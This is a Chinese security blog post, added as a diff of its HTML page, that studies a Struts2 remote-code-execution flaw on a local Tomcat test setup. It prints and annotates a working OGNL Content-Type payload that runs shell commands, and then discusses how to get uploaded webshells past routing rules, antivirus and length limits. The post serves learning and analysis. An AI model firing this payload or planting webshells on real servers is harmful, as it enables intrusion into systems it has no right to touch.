@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<!--[if lte IE 8 ]>
+<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+<![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<!--
+***************  *      *     *
+      8          *    *       *
+      8          *  *         *
+      8          **           *
+      8          *  *         *
+      8          *    *       *
+      8          *      *     *
+      8          *        *   ***********    -----Theme By Kieran(http://go.kieran.top)
+-->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+<!--<![endif]-->
+
+<head>
+  <title>Struts2-S054漏洞学习及其他 | 零の杂货铺</title>
+  <!-- Meta data -->
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="generator" content="零の杂货铺">
+    <meta name="author" content="Phantom">
+    <meta name="description" content="Free and Share" />
+    <meta name="keywords" content="" />
+
+    <!-- Favicon, (keep icon in root folder) -->
+    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">
+
+    <link rel="alternate" href="/atom.xml" title="零の杂货铺" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
+	
+    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
+    
+    
+
+    <!-- Custom stylesheet, (add custom styles here, always load last) -->
+    <!-- Load our stylesheet for IE8 -->
+    <!--[if IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
+    <![endif]-->
+
+    <!-- Google Webfonts (Monserrat 400/700, Open Sans 400/600) -->
+    <link href='//phantom0301.cc/css/Montserrat.css' rel='stylesheet' type='text/css'>
+    <link href='//phantom0301.cc/css/Open Sans.css' rel='stylesheet' type='text/css'>
+
+    <!-- Load our fonts individually if IE8+, to avoid faux bold & italic rendering -->
+    <!--[if IE]>
+    <link href='http://phantom0301.cc/css/Montserrat400.css' rel='stylesheet' type='text/css'>
+    <link href='http://phantom0301.cc/css/Montserrat700.css' rel='stylesheet' type='text/css'>
+    <link href='http://phantom0301.cc/css/Open Sans400.css' rel='stylesheet' type='text/css'>
+    <link href='http://phantom0301.cc/css/Open Sans600.css' rel='stylesheet' type='text/css'>
+    <![endif]-->
+
+    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
+    <script src="/js/jquery-1.11.1.min.js"></script>
+    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>
+
+    <!-- Load these in the <head> for quicker IE8+ load times -->
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="/js/html5shiv.min.js"></script>
+    <script src="/js/respond.min.js"></script>
+    <![endif]-->
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link rel="alternate" type="application/atom+xml" title="Atom 0.3" href="atom.xml">
+  
+  
+
+  
+  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body id="index" class="lightnav animsition">
+
+      <!-- ============================ Off-canvas navigation =========================== -->
+
+    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
+        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
+            <img src="/img/close.png" alt="Close"/>
+        </div>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu">
+            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
+            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
+            <!-- Dropdown Menu -->
+			 
+            <li>
+                <a class="sb-toggle-submenu">Works<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                        <li><a href="/sitemap.xml" target="_BLANK" class="animsition-link">Sitemap</a></li>
+                    
+                        <li><a href="/atom.xml" target="_BLANK" class="animsition-link">Rss</a></li>
+                    
+                </ul>
+            </li>
+            
+            
+        	<li>
+        		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
+            	<ul class="sb-submenu">
+				  	
+				    <li><a href="/categories/Docker/" class="animsition-link">Docker<small>(3)</small></a></li>
+				    
+				    <li><a href="/categories/HEXO/" class="animsition-link">HEXO<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/JAVA/" class="animsition-link">JAVA<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/Javascript/" class="animsition-link">Javascript<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/python/" class="animsition-link">python<small>(3)</small></a></li>
+				    
+				    <li><a href="/categories/ubuntu/" class="animsition-link">ubuntu<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/安全基础/" class="animsition-link">安全基础<small>(5)</small></a></li>
+				    
+				    <li><a href="/categories/安全工具/" class="animsition-link">安全工具<small>(2)</small></a></li>
+				    
+				    <li><a href="/categories/审计/" class="animsition-link">审计<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/工具/" class="animsition-link">工具<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/感悟/" class="animsition-link">感悟<small>(3)</small></a></li>
+				    
+				    <li><a href="/categories/蜜罐/" class="animsition-link">蜜罐<small>(3)</small></a></li>
+				    
+				    <li><a href="/categories/读书笔记/" class="animsition-link">读书笔记<small>(3)</small></a></li>
+				    
+				</ul>
+        	</li>
+			
+            
+            <li>
+                <a class="sb-toggle-submenu">Links<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                    <li><a href="http://www.ourren.com/" class="animsition-link">ourren</a></li>
+                    
+                    <li><a href="https://www.sec-wiki.com/" class="animsition-link">sec-wiki</a></li>
+                    
+                    <li><a href="http://anquanquan.info/" class="animsition-link">安全圈</a></li>
+                    
+                    <li><a href="http://go.kieran.top/" class="animsition-link">Kieran</a></li>
+                    
+                    <li><a href="http://wps2015.org/" class="animsition-link">wps2015的博客</a></li>
+                    
+                    <li><a href="http://www.mauu.me/" class="animsition-link">mauu的博客</a></li>
+                    
+                    <li><a href="http://ecma.io/" class="animsition-link">该隐的博客</a></li>
+                    
+                    <li><a href="http://ohroot.com/" class="animsition-link">ohroot的博客</a></li>
+                    
+                    <li><a href="http://www.sccsec.com/" class="animsition-link">胖胖的博客</a></li>
+                    
+                    <li><a href="http://phantom0301.github.io" class="animsition-link">phantom0301 for gitbub</a></li>
+                    
+                    <li><a href="http://phantom0301.coding.me" class="animsition-link">phantom0301 for coding</a></li>
+                    
+                    <li><a href="http://blackwolfsec.github.io" class="animsition-link">blackwolfsec</a></li>
+                    
+                    <li><a href="http://wsyks.github.io/" class="animsition-link">wsyks</a></li>
+                    
+                </ul>
+            </li>
+            
+        </ul>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu secondary">
+            <li><a href="/about/" class="animsition-link" title="about">About</a></li>
+            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
+        </ul>
+    </div>
+    
+    <!-- ============================ END Off-canvas navigation =========================== -->
+
+    <!-- ============================ #sb-site Main Page Wrapper =========================== -->
+
+    <div id="sb-site">
+        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+        <div id="navigation" class="navbar navbar-fixed-top">
+            <div class="navbar-inner">
+                <div class="container">
+                    <!-- Nav logo -->
+                    <div class="logo">
+                        <a href="/" title="Logo" class="animsition-link">
+                         <img src="/img/logo.png" alt="Logo" width="35px;"/> 
+                        </a>
+                    </div>
+                    <!-- // Nav logo -->
+                    <!-- Info-bar -->
+                    <nav>
+                        <ul class="nav">
+                            <li><a href="/" class="animsition-link">零の杂货铺</a></li>
+                            <li class="nolink"><span>Always </span>Creative.</li>
+                            
+                            <li><a href="https://github.com/phantom0301" title="Github" target="_blank"><i class="icon-github"></i></a></li>
+                            
+                            
+                            <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a></li>
+                            
+                            
+                            <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a></li>
+                            
+                            
+                            <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a></li>
+                            
+                            
+                            <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a></li>
+                            
+                            <li class="nolink"><span>Welcome!</span></li>
+                        </ul>
+                    </nav>
+                    <!--// Info-bar -->
+                </div>
+                <!-- // .container -->
+                <div class="learnmore sb-toggle-right">More</div>
+                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar before"></span>
+                <span class="icon-bar main"></span>
+                <span class="icon-bar after"></span>
+                </button>
+            </div>
+            <!-- // .navbar-inner -->
+        </div>
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+        <!-- ============================ Hero Image =========================== -->
+
+        <section id="hero" class="scrollme">
+            <div class="container-fluid element-img" style="background: url(/img/bg_img.jpg) no-repeat center center fixed;background-size: cover">
+                <div class="row">
+                    <div class="col-xs-12 col-sm-8 col-sm-offset-2 col-md-8 col-md-offset-2 vertical-align cover boost text-center">
+                        <div class="center-me animateme" data-when="exit" data-from="0" data-to="0.6" data-opacity="0" data-translatey="100">
+                            <div>
+                            	
+                                <h2>君は春の中にいる、かけがえのない春の中にいる.</h2>
+                                <p></p>
+				    			
+                                <h2></h2>
+                                <p>你驻足于春色中,于那独一无二的春色之中.</p>
+				    			
+
+                            </div>
+                        </div>
+                    </div>
+                    <!-- // .col-md-12 -->
+                </div>
+                <div class="herofade beige-dk"></div>
+            </div>
+        </section>
+
+        <!-- Height spacing helper -->
+        <div class="heightblock"></div>
+        <!-- // End height spacing helper -->
+
+        <!-- ============================ END Hero Image =========================== -->
+      
+<section id="intro">
+    <div class="container">
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2017-03-13T11:30:45.000Z" itemprop="datePublished">
+          2017-03-13
+      </time>
+    
+    
+    | 
+    <a href='/tags/struts2/'>struts2</a>,
+    
+    <a href='/tags/漏洞学习/'>漏洞学习</a>
+    
+    
+</span>
+                <h1>Struts2-S054漏洞学习及其他</h1>
+            </div>
+        </div>
+        <div class="col-md-8 col-md-offset-2">
+      		<p>Struts2的环境有时候显得有些庞大而复杂，这里借着漏洞学习的过程了解一下Tomcat+Struts2架构的一些问题，这么一看重要的学习其他而不是漏洞了~~。<br><a id="more"></a></p>
+<h2 id="0x01-Java-Tomcat-Struts2"><a href="#0x01-Java-Tomcat-Struts2" class="headerlink" title="0x01 Java+Tomcat+Struts2"></a>0x01 Java+Tomcat+Struts2</h2><p>之前很少接触Java环境下的Web问题，对于Jboss，Tomcat，Struts2，Weblogic等等的概念没有一下清晰的认识，通过查阅资料，有了如下的认识。</p>
+<p>首先这些应用都是为了完成一个Java的Web服务，那么，在拥有Java环境的情况下，我们需要一个能够监听Web服务并且调度相关逻辑的服务器，这个就是Tomcat起到的作用。</p>
+<p>和Tomcat具有同样身份作用的还有Jboss，Resin，Glassfish和Weblogic，那么其实Struts2都可以部署在这些Java容器中，这里就以Tomcat为例，一个运行成功的Tomcat应用如下图所示。</p>
+<p><img src="http://123.207.68.169/achiveimg/20170313200921.jpg" alt=""></p>
+<p>我们可以看一下默认的Tomcat目录</p>
+<pre><code>bin  # 启动/关闭服务的脚本
+ |-bootstrap.jar  # 引导程序
+ |-commons-daemon.jar  # 守护程序
+ |-tomcat-juli.jar  # java util logging 日志管理
+ |-daemon.sh
+ |-startup.sh
+ |-shutdown.sh
+ |-setclasspath.sh  # 动态设置JAVA变量,内部使用
+ |-digest.sh  #  使用特殊的算法加密
+ |-tool-wrapper.sh  # 封装工具，内部使用
+ |-version.sh  #  检测版本
+ |-configtest.sh  # 测试配置文件语法
+ |-catalina.sh  #  启动相应的java程序
+ |-catalina-tasks.xml  # 加载包路径
+conf
+ |-Catalina  # 默认似乎是空的，可以用来配置项目路径
+ |-catalina.properties  # catalina的安全设置、类加载设置、字符缓存设置
+ |-catalina.policy  # 安全策略
+ |-jaspic-providers.xml  # 身份验证模块配置
+ |-jaspic-providers.xsd  # 似乎xsd在这里是变量定义 
+ |-logging.properties  # 日志记录配置
+ |-tomcat-users.xml  
+ |-web.xml  # Web基础配置
+ |-context.xml  # 配置策略的路径
+ |-server.xml  # 服务端信息配置，端口，日志存储方式，根路径等等    
+lib
+ |-*.jar  # java封装库
+logs
+ |-*.log  # 日志存储文件
+temp
+webapps
+ |-*.war  # 打包的Web程序
+ |-*  # 自动解压的Web 页面程序
+work
+ |-*  # 对应webapps的类库
+</code></pre><p>*安全策略，包括对于一些系统变量的读取限制，特殊的函数执行限制，文件的读写控制</p>
+<p>下图是一张Tomcat的层级关系</p>
+<p><img src="http://123.207.68.169/achiveimg/20170313211929.jpg" alt=""></p>
+<p>简单认识了一下Tomcat的结构后，我们来部署一个含有S054漏洞的struts2应用，下载struts2后，拷贝apps中的structs2-blank.war到Tomcat的webapps目录下，重启Tomcat，就会自动解压war包。</p>
+<p>访问 <a href="http://127.0.0.1:8080/struts2-blank/example/HelloWorld.action" target="_blank" rel="external">http://127.0.0.1:8080/struts2-blank/example/HelloWorld.action</a><br>就可以访问到一个struts自带的欢迎界面</p>
+<p>我们尝试修改解压出来的应用文件夹名为ROOT，发现在没有任何配置的情况下，tomcat会默认访问ROOT文件夹，而其他文件夹可以通过路由访问，当然前提是策略允许访问，</p>
+<p>同时，我在之前提到了路径还可以配置在conf中，我们尝试创建一个指定根路径为structs2-blank的配置文件于conf/Catalina/localhost中也可以实现当Web文件不在webapps中时的路由访问。</p>
+<p>再来看一下struts默认的目录结构</p>
+<pre><code>docs  # 文档
+apps  # struts2的war包，提供样例参考
+ |-blank
+ |-mailreader
+ |-portlet
+ |-rest-showcase
+ |-showcase
+lib  # jar包库
+src  # struts2的源码
+</code></pre><p>我们使用blank来做测试用，blank基本展示了struts2应用应该有的几部分：</p>
+<pre><code>WEB-INF
+|-web.xml  # 过滤器配置文件以及基础路径配置
+|-src  # 源码
+|-lib  # jar库
+|-jsp  # jsp文件夹
+|-classes  # 类和其他配置文件文件夹
+META-INF  # 元信息
+</code></pre><h2 id="0x02-漏洞测试"><a href="#0x02-漏洞测试" class="headerlink" title="0x02 漏洞测试"></a>0x02 漏洞测试</h2><p>这里就直接使用struts2自带的欢迎页面来测试：</p>
+<p><a href="http://127.0.0.1:8080/struts2-blank/example/HelloWorld.action" target="_blank" rel="external">http://127.0.0.1:8080/struts2-blank/example/HelloWorld.action</a></p>
+<p>先利用网上流传的工具来进行测试：</p>
+<p><img src="http://123.207.68.169/achiveimg/20170314140943.jpg" alt=""></p>
+<p>确实存在漏洞，这个时候我们抓包进行细节的复现。在GET包中增加Content-Type字段，使用网上流传的Payload：</p>
+<pre><code>%{
+(#nike=&apos;multipart/form-data&apos;).
+(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
+(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).
+(#ognlUtil=#container.getInstance
+(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
+(#ognlUtil.getExcludedPackageNames().clear()).
+(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess
+(#dm)))).(#cmd=&apos;whoami&apos;).(#iswin=(@java.lang.System@getProperty
+(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?
+{&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd}:{&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd})).(#p=new 
+java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).
+(#process=#p.start()).(#ros=
+(@org.apache.struts2.ServletActionContext@getResponse
+().getOutputStream())).(@org.apache.commons.io.IOUtils@copy
+(#process.getInputStream(),#ros)).(#ros.flush())
+}
+</code></pre><p>对上面一段payload进行格式整理</p>
+<pre><code>%{
+    (#nike=&apos;multipart/form-data&apos;).  访问非根对象nike
+    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).  调用静态方法
+    (
+    #_memberAccess?
+        (#_memberAccess=#dm):
+        (
+            (#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).
+            (
+                #ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)  创建类实例
+            ).
+            (#ognlUtil.getExcludedPackageNames().clear()).
+            (#ognlUtil.getExcludedClasses().clear()).
+            (
+            #context.setMemberAccess(#dm)
+            )
+        )
+    ).
+    (#cmd=&apos;whoami&apos;).
+    (
+        #iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))
+    ).
+    (
+    #cmds=(#iswin?{&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd}:{&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd})
+    ).
+    (
+    #p=new java.lang.ProcessBuilder(#cmds)
+    ).
+    (#p.redirectErrorStream(true)).
+    (#process=#p.start()).
+    (
+    #ros=
+        (
+        @org.apache.struts2.ServletActionContext@getResponse().getOutputStream()
+        )
+    ).
+    (
+    @org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)
+    ).
+    (#ros.flush())
+}
+</code></pre><p>根据大牛们的解读文章，可以了解到</p>
+<p>首先是<em>multipart/form-data</em>绕过类型判断，然后调用了<em>@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</em>这个方法给了<em>#_memberAccess</em>这个节点，然后就是利用<em>java.lang.ProcessBuilder</em>执行预定的cmd命令，对执行后的错误流进行重定向显示。~~当然这只能算是对于这段payload的主观感觉猜测。</p>
+<p>详细的底层分析可以阅读这篇文章</p>
+<p><a href="http://paper.seebug.org/247/" title="http://paper.seebug.org/247/" target="_blank" rel="external">http://paper.seebug.org/247/</a></p>
+<h2 id="0x03-JSP解析的问题"><a href="#0x03-JSP解析的问题" class="headerlink" title="0x03 JSP解析的问题"></a>0x03 JSP解析的问题</h2><p>有朋友在测试时发现，在有漏洞的站点执行命令是很容易的，反弹Shell也可以轻松完成，但上传Webshell就不见得每次都能够顺利完成，而很多时候如果能使用Webshell进行图形界面操作会更加方便。这里就常见的几种上传失败情况进行总结。</p>
+<p>1.上传成功但解析跳转：</p>
+<p>这种情况对应到之前说到的路由关系，我们仍然使用struts2-blank来测试。</p>
+<p>blank默认情况下，有策略限制直接跳转到jsp。</p>
+<p>访问URL：struts2-blank/WEB-INF/jsp/example/Login.jsp，页面会显示403。<br>这个时候发现访问Login.action可以访问成功。此时，如果在当前文件夹下上传test.jsp，必须使用test或者test.action来访问。</p>
+<p>值得一提的是，这种对攻击者上传文件的成功访问是基于以下这条规则：</p>
+<pre><code>&lt;action name=&quot;*&quot; class=&quot;example.ExampleSupport&quot;&gt;
+    &lt;result&gt;/WEB-INF/jsp/example/{1}.jsp&lt;/result&gt;
+&lt;/action&gt;
+</code></pre><p>简单解释一下，class相当于处理逻辑（Model？），然后对action 的name进行全匹配，将匹配到的文件名进行相应的jsp（View？）跳转。</p>
+<p>而之所以test和test.action都可以被访问到应该是一种缺省规则，在struts.xml中添加如下规则：</p>
+<pre><code>&lt;constant name=&quot;struts.action.extension&quot; value=&quot;action&quot;&gt;&lt;/constant&gt;
+</code></pre><p>此时，test就无法被访问到。</p>
+<p>从上面这种情况来看，跳转的原因首先是对接收的后缀进行匹配，其次是相关action动作的处理，那么我们就可以通过添加和上面相似的规则来实现Webshell的访问。</p>
+<p>这里就不得不提一下struts的运行机制</p>
+<pre><code>struts.xml,这个按照我的理解就相当于是一个控制器，进行路由控制
+    |
+    |
+   \ /
+  class，当路由得到相应的action名后，以相应的method来调用class处理逻辑
+    |
+    |
+   \ /
+   jsp,根据处理逻辑的不同，跳转给用户相应的显示页面
+</code></pre><p>这里从我理解的MVC的角度进行解释，根据我查阅的资料，再往下走应该是struts2的filter机制，这里我就先不去理解了。</p>
+<p>2.上传成功，解析出错</p>
+<p>这种情况主要分为两种，一种是解析错但菜刀依然可以执行，另一种是类文件或者库文件缺失，个人猜测通过上传相应的文件到lib或者classes文件夹来进行尝试，但因为缺乏相应的测试条件，这个问题先留在这里，后面实践了再来补写。</p>
+<p>3.无法上传</p>
+<p>根据朋友讲的他遇到的经历，无法上传主要有以下几种情况：</p>
+<ul>
+<li>有防护软件进行文件查杀，这种可以通过一些特殊的Shell来绕过</li>
+<li>长度限制，这种存在于一些服务器对于请求包有所限制，导致过长的shell无法成功上传。</li>
+<li>在手动写文件时，还有些服务器禁用echo等写文件命令也会导致文件出错</li>
+</ul>
+<h2 id="0x04-其他"><a href="#0x04-其他" class="headerlink" title="0x04 其他"></a>0x04 其他</h2><p>在实际测试中发现，许多struts2的应用广泛使用了许多其他中间件，比如Hiberate、HyperSQL等等平时没有使用到的框架或者数据库，还有会使用其他Web服务器的情况，比如JBoss。</p>
+
+            <div class="clearfix"></div>
+            <hr class="nogutter">
+        </div>
+        <nav class="pagination" role="pagination">
+    
+    
+    <a class="pull-right" href="/2017/03/05/ids-ga/">
+        英文文献阅读-使用遗传算法的异常入侵检测 →
+    </a>
+    
+</nav>
+
+        <div class="duoshuo">
+<div class="ds-thread" data-thread-key="2017/03/13/struts2/" data-title="Struts2-S054漏洞学习及其他" data-url="http://phantom0301.coding.me/2017/03/13/struts2/"></div>
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"phantom0301"};
+(function() {
+	var ds = document.createElement('script');
+	ds.type = 'text/javascript';ds.async = true;
+	ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+	ds.charset = 'UTF-8';
+	(document.getElementsByTagName('head')[0] 
+	 || document.getElementsByTagName('body')[0]).appendChild(ds);
+})();
+</script>
+
+
+</div>
+    </div>
+</section>
+
+
+      
+<!-- ============================ Footer =========================== -->
+
+<footer>
+    <div class="container">
+            <div class="copy">
+                <p>
+                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By Phantom. All Rights Reserved.
+                </p>
+                <p>Theme By <a href="//go.kieran.top" style="color: #767D84">Kieran</a></p>
+            </div>
+            <div class="social">
+                <ul>
+                    
+                    <li><a href="https://github.com/phantom0301" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a>&nbsp;</li>
+                    
+                </ul>
+            </div>
+            <div class="clearfix"> </div>
+        </div>
+</footer>
+
+<!-- ============================ END Footer =========================== -->
+      <!-- Load our scripts -->
+        
+<!-- Resizable 'on-demand' full-height hero -->
+<script type="text/javascript">
+    
+    var resizeHero = function () {
+        var hero = $(".cover,.heightblock"),
+            window1 = $(window);
+        hero.css({
+            "height": window1.height()
+        });
+    };
+    
+    resizeHero();
+    
+    $(window).resize(function () {
+        resizeHero();
+    });
+</script>
+<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
+<script src="/js/jquery.flexslider-min.js"></script><!-- Flexslider plugin -->
+<script src="/js/scripts.js"></script><!-- Theme scripts -->
+
+<!-- Initiate flexslider plugin -->
+<script type="text/javascript">
+    $(document).ready(function($) {
+      $('.flexslider').flexslider({
+        animation: "fade",
+        prevText: "",
+        nextText: "",
+        directionNav: true
+      });
+    });
+</script>
+
+
+</body>
+</html>
